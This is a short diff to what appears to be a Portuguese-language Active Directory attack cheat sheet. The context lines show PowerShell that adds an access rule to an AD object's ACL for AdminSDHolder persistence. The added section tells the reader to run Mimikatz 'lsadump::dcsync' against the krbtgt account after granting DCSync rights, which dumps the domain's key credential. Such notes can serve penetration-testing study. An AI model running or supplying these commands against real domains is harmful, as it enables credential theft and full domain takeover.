@@ -1686,8 +1686,11 @@ $MyACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $MyAdmin,
 $MyACL.AddAccessRule($MyACE)
 Set-acl -aclobject $MyACL $MyDistinguishedNameAD
 ```
-
-
+##### ADMIN SDHOLDER - DEPOIS DE DAR A PERMISSÃO PARA DCSYNC, EXECUTAR O DCSYNC DO MIMIKATZ EM QQ MAQUINA
+```
+.\Mimikatz
+lsadump::dcsync /user:tech\krbtgt
+```
 
 
 
